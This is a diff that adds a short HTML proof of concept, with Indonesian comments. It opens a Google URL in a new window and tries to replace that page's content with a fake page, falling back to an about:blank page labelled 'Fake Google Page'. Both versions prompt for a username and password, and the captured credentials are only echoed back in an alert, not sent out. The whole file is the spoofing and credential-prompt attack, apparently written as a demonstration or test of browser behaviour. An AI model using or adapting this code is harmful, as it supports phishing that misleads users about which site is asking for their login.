@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="spoof()">Click to spoof</button>
+
+  <script>
+    function spoof() {
+      // Simpan referensi ke window saat ini
+      const originalWindow = window;
+      
+      // Buka window baru
+      const win = window.open("https://www.google.com/csi", "_blank");
+      
+      setTimeout(() => {
+        try {
+          // Coba manipulasi history dan URL
+          win.history.replaceState(null, "", "/");
+          
+          // Tulis konten baru
+          win.document.body.innerHTML = `
+            <h1>This is not Google!</h1>
+            <button onclick="
+              let username = prompt('Enter your username');
+              let password = prompt('Enter your password');
+              alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+            ">Click me</button>
+          `;
+        } catch (e) {
+          console.warn("Blocked by browser:", e);
+          
+          // Fallback: gunakan about:blank
+          const newWin = window.open("about:blank", "_blank");
+          newWin.document.write(`
+            <h1>Fake Google Page</h1>
+            <p>URL will show about:blank</p>
+            <button onclick="
+              let username = prompt('Enter your username');
+              let password = prompt('Enter your password');
+              alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+            ">Click me</button>
+          `);
+          newWin.document.close();
+        }
+      }, 100);
+    }
+  </script>
+</body>
+</html>
